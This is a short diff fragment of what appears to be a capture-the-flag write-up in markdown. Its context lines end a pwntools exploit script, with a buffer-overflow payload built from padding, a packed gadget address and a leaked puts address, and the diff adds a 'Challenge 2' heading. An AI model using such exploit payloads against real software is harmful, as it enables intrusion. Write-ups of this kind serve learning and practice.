@@ -141,3 +141,5 @@ p.sendline(b"B"*0x60 + b"C"*8 + p64(0x000000000040122b) + p64(int(leak_puts, 16)
 p.interactive()
 
 ```
+
+### Challenge 2
